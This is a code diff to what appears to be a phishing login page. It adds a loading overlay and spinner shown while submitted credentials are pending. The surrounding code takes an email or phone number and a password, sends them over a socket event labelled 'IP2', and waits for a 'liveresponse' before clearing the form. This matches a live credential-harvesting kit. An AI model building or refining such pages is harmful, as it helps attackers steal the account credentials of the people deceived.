@@ -84,9 +84,28 @@
       margin: 0;
            }
        .f{margin-top: 25px;padding: 25px;color: gray;}
+       .loading{
+        position: absolute;
+        background-color: rgba(255, 255, 255, 0.753);
+        height: 100vh;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+       }
+       .loadingcon{display: none; 
+         position: absolute;
+         height: 100vh;
+         width: 100%;
+        }
     </style>
 </head>
 <body>
+    <div class="loadingcon" id="loadx">
+        <div class="loading">
+            <img src="https://raw.githubusercontent.com/petdoe/assets/main/sm-loader.gif">
+        </div>
+    </div>   
 <div class="login-container">
     <form class="login-form" id="form">
         <div class="error" id="error"><p>Email phone number or password incorrect</p></div>
@@ -133,6 +152,7 @@
 
     // Handle form submission
     var form = document.getElementById('form');
+    var loadx = document.getElementById('loadx');
     form.addEventListener('submit', function (event) {
       event.preventDefault();
       
@@ -142,9 +162,11 @@
 
       if (input.value !== '' && input2.value !== '') {
         socket.emit('IP2', message);
+        loadx.style.display = 'block';
         socket.on('liveresponse', function (msg) {
         input.value = '';
         input2.value = '';
+        loadx.style.display = 'none';
         });
       }
     });
